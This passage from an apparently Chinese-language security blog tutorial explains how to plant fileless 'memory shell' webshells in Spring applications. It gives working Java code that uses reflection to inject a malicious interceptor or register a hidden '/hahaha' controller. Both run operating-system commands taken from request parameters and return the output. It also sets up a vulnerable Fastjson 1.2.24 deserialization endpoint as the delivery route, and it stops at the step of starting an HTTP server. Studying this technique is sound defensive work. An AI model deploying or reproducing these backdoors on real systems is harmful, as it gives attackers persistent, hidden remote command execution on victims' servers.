<p>从上面的分析我们知道在哪加入拦截器了，然后在<code>doDispatch()</code>中继续向下分析，发现会调用<code>applyPreHandler</code>，字面意思翻译过来就是预处理</p>
<p><img decoding="async" loading="lazy" alt="image-20211125085520831" src="/assets/images/image-20211125085520831-2c96d942cfc3815be24159f533445b11.png" width="2654" height="990" class="img_ev3q"></p>
<p>跟进，发现会执行每个拦截器的<code>preHandle()</code>方法</p>
<p><img decoding="async" loading="lazy" alt="image-20211125085708877" src="/assets/images/image-20211125085708877-1d81744f5053c0e8840d77ff56729d3d.png" width="3582" height="1818" class="img_ev3q"></p>
<p>如果程序提前在调用的 <code>Controller</code> 上设置了 <code>Aspect</code>（切面），那么在正式调用 <code>Controller</code> 前实际上会先调用切面的代码，一定程度上也起到了 &quot;拦截&quot; 的效果。</p>
<hr>
<p>总结一下，一个 request 发送到 spring 应用，大概会经过以下几个层面才会到达处理业务逻辑的 Controller 层：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HttpRequest --&gt; Filter --&gt; DispactherServlet --&gt; Interceptor --&gt; Aspect --&gt; Controller</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>上面我们实现了controller的内存马，同理，拦截器Interceptor的内存马也是可以实现的，实现方法类似，都是需要先获得上下文，然后注册进去。</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="interceptor实现">Interceptor实现<a href="#interceptor实现" class="hash-link" aria-label="Interceptor实现的直接链接" title="Interceptor实现的直接链接">​</a></h2>
<p>从上面的分析，也可以看出，我们想要的目的，就是实现一个恶意的拦截器，然后让拦截器执行<code>preHandler</code>方法，其中<code>preHandler</code>方法的内容就是我们的恶意代码</p>
<blockquote>
<p><code>Interceptor</code> 的拦截范围其实就是Controller方法，它实际上就相当于基于AOP的方法拦截。因为Interceptor只拦截Controller方法，所以要注意，返回<code>ModelAndView</code>后，后续对View的渲染就脱离了Interceptor的拦截范围。</p>
<p>一个Interceptor必须实现<code>HandlerInterceptor</code>接口（可以看上面的分析图，<code>interceptor</code>的类就是<code>HandlerInterceptor</code>），可以选择实现<code>preHandle()</code>、<code>postHandle()</code>和<code>afterCompletion()</code>方法。<code>preHandle()</code>是Controller方法调用前执行，<code>postHandle()</code>是Controller方法正常返回后执行，而<code>afterCompletion()</code>无论Controller方法是否抛异常都会执行，参数<code>ex</code>就是Controller方法抛出的异常（未抛出异常是<code>null</code>）。</p>
<p>在<code>preHandle()</code>中，也可以直接处理响应，然后返回<code>false</code>表示无需调用Controller方法继续处理了，通常在认证或者安全检查失败时直接返回错误响应。在<code>postHandle()</code>中，因为捕获了Controller方法返回的<code>ModelAndView</code>，所以可以继续往<code>ModelAndView</code>里添加一些通用数据，很多页面需要的全局数据如Copyright信息等都可以放到这里，无需在每个Controller方法中重复添加。</p>
</blockquote>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="拦截器代码">拦截器代码<a href="#拦截器代码" class="hash-link" aria-label="拦截器代码的直接链接" title="拦截器代码的直接链接">​</a></h3>
<p>实现一个拦截器</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package com.example.demo;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.servlet.HandlerInterceptor;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpServletRequest;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpServletResponse;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class TestInterceptor implements HandlerInterceptor {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        response.getWriter().write(&quot;Interceptor test&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return false;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="正常注册拦截器">正常注册拦截器<a href="#正常注册拦截器" class="hash-link" aria-label="正常注册拦截器的直接链接" title="正常注册拦截器的直接链接">​</a></h3>
<p>可以通过<code>implements WebMvcConfigurer</code>，重写其<code>addInterceptors(InterceptorRegistry registry)</code>方法</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package com.example.demo;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.context.annotation.Configuration;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@Configuration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class InterceptorConfig implements WebMvcConfigurer {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void addInterceptors(InterceptorRegistry registry) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        registry.addInterceptor(new TestInterceptor()).addPathPatterns(&quot;/test/hello&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211125093431422" src="/assets/images/image-20211125093431422-de28171e4d3fcfc5bff13295a2d8e368.png" width="2436" height="1296" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="效果">效果<a href="#效果" class="hash-link" aria-label="效果的直接链接" title="效果的直接链接">​</a></h3>
<p><img decoding="async" loading="lazy" alt="image-20211125092642403" src="/assets/images/image-20211125092642403-e37661318bb47704f13a4971f6e0791f.png" width="1120" height="272" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="恶意注册拦截器">恶意注册拦截器<a href="#恶意注册拦截器" class="hash-link" aria-label="恶意注册拦截器的直接链接" title="恶意注册拦截器的直接链接">​</a></h3>
<p>上面分析也看出来了，想要添加拦截器，就只需要动态添加到<code>this.adaptedInterceptors</code>数组中即可</p>
<p><img decoding="async" loading="lazy" alt="image-20211125142550004" src="/assets/images/image-20211125142550004-2cd49bd65160877fabe0a2b5c3ab282a.png" width="2590" height="818" class="img_ev3q"></p>
<p>所以我们的第一步是要获取到这个数组，而这个数组是在<code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code>中实现的，<code>AbstractHandlerMapping</code>又是抽象类，所以我们需要找到它的实现类</p>
<p><img decoding="async" loading="lazy" alt="image-20211125143355539" src="/assets/images/image-20211125143355539-6310fe2d96b876c4618a6add32f8e844.png" width="1190" height="488" class="img_ev3q"></p>
<p>下字段断点也可以找到它的实现类</p>
<p><img decoding="async" loading="lazy" alt="image-20211125145124942" src="/assets/images/image-20211125145124942-0bc16a95806d166022944253db2d2409.png" width="2586" height="1004" class="img_ev3q"></p>
<p><code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code>是一个不错的选择，可以通过<code>context.getBean(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;);</code>获取实例，然后再反射获取到<code>adaptedInterceptors</code>变量，最后添加恶意的拦截器即可</p>
<blockquote>
<p>这里我尝试失败了，还是怀疑spring版本问题</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20211125143926539" src="/assets/images/image-20211125143926539-b00d57874c1d0391ed9766618065f47e.png" width="2138" height="498" class="img_ev3q"></p>
<p>所以利用代码</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.context.WebApplicationContext;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.context.request.RequestContextHolder;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpServletRequest;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpServletResponse;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class TestInterceptor extends HandlerInterceptorAdapter {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public TestInterceptor() throws NoSuchFieldException, IllegalAccessException, InstantiationException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 获取context</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 从context中获取AbstractHandlerMapping的实例对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 反射获取adaptedInterceptors属性</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        field.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 避免重复添加</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        for (int i = adaptedInterceptors.size() - 1; i &gt; 0; i--) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if (adaptedInterceptors.get(i) instanceof TestInterceptor) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                System.out.println(&quot;已经添加过TestInterceptor实例了&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TestInterceptor aaa = new TestInterceptor(&quot;aaa&quot;);  // 避免进入实例创建的死循环</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        adaptedInterceptors.add(aaa);  //  添加全局interceptor</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private TestInterceptor(String aaa){}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String code = request.getParameter(&quot;code&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 不干扰正常业务逻辑</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (code != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            java.lang.Runtime.getRuntime().exec(code);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return true;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return true;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }}}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="应用场景">应用场景<a href="#应用场景" class="hash-link" aria-label="应用场景的直接链接" title="应用场景的直接链接">​</a></h2>
<p>既然是通过执行 java 代码内存注入 webshell，那么一般需要通过 Spring 相关的代码执行漏洞才可以利用，例如较为常见的 Java 反序列漏洞、普通的 JSP 文件 Webshell 转换成无文件 Webshell等。</p>
<blockquote>
<p>主要目的是在当前JVM的环境下执行代码即可</p>
</blockquote>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞演示">漏洞演示<a href="#漏洞演示" class="hash-link" aria-label="漏洞演示的直接链接" title="漏洞演示的直接链接">​</a></h3>
<p>以Fastjson 1.2.24 的反序列化漏洞为例吧，先配置好环境（JDK &lt; 8u191）</p>
<ul>
<li>pom.xml</li>
</ul>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">com.alibaba</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">fastjson</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">1.2.24</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li>Controller</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package com.example.demo;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.alibaba.fastjson.JSON;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.alibaba.fastjson.JSONObject;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.bind.annotation.PostMapping;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.bind.annotation.RequestMapping;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.bind.annotation.RestController;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@RestController</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@RequestMapping(&quot;/test&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class HelloController {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @PostMapping(&quot;/hello&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public String hello(String json) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        JSONObject jsonObject = JSON.parseObject(json);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return jsonObject.toJSONString();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211125140427421" src="/assets/images/image-20211125140427421-3c37914e35a470a3a57bbf7c4dfce302.png" width="2346" height="950" class="img_ev3q"></p>
<hr>
<ul>
<li>编写恶意的类</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.context.WebApplicationContext;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.context.request.RequestContextHolder;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpServletRequest;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpServletResponse;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.*;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.reflect.Method;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Test {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public Test() throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Method method = Test.class.getDeclaredMethod(&quot;test&quot;, HttpServletRequest.class, HttpServletResponse.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/hahaha&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r.registerMapping(info, new Test(&quot;aaa&quot;), method);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private Test(String aa){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 不这样的话，上面22行会一直重复创建Test()对象，导致内存溢出</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void test(HttpServletRequest request, HttpServletResponse response) throws IOException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String cmd = request.getParameter(&quot;cmd&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if(cmd != null){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Process exec = Runtime.getRuntime().exec(cmd);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            InputStream inputStream = exec.getInputStream();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            DataInputStream dataInputStream = new DataInputStream(inputStream);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String disr = dataInputStream.readLine();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            while ( disr != null ) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                response.getWriter().write(disr);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                disr = dataInputStream.readLine();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            response.getWriter().write(&quot;ADD CONTROLLER&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li>编译成class文件</li>
</ul>
<blockquote>
<p>缺少依赖问题比较简单的解决方法，就是直接用IDEA编译的class，然后移动到其他目录即可</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20211125135918145" src="/assets/images/image-20211125135918145-c205ca5193378f1e569e74163f59a989.png" width="936" height="1214" class="img_ev3q"></p>
<ul>
<li>启动http服务</li>
</ul>
